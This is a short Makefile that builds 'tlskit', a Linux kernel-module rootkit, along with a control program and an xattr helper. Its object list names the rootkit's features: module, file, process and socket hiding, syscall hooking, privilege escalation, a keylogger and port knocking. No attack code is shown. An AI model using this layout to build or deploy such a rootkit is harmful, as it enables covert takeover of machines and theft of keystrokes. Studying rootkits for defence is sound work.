SRC_DIR     := src
ROOTKIT     := tlskit

all: xattr rkctl tlskit

obj-m += $(ROOTKIT).o

tlskit-objs += 	$(SRC_DIR)/lkm.o \
				$(SRC_DIR)/module_hiding.o \
				$(SRC_DIR)/helper.o \
				$(SRC_DIR)/syscall_hooking.o \
				$(SRC_DIR)/priv_escalation.o \
				$(SRC_DIR)/keylogger.o \
				$(SRC_DIR)/csprng.o \
				$(SRC_DIR)/file_hiding.o \
				$(SRC_DIR)/proc_hook.o \
				$(SRC_DIR)/process_hiding.o \
				$(SRC_DIR)/ftrace.o \
				$(SRC_DIR)/socket_hiding.o \
				$(SRC_DIR)/port_knocking.o

tlskit:
	echo "Compiling lkm tlskit ..."
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	# remove the unnecessary files
	rm -f $(SRC_DIR)/*.o *.mod.c *.o modules.order Module.symvers

rkctl: $(SRC_DIR)/rkctl.c
	echo "Compiling tlskit control program ..."
	gcc -o rkctl $(SRC_DIR)/rkctl.c

xattr: $(SRC_DIR)/xattr.c
	echo "Compiling xattr helper ..."
	gcc -o xattr $(SRC_DIR)/xattr.c

clean:
	rm -rf rkctl xattr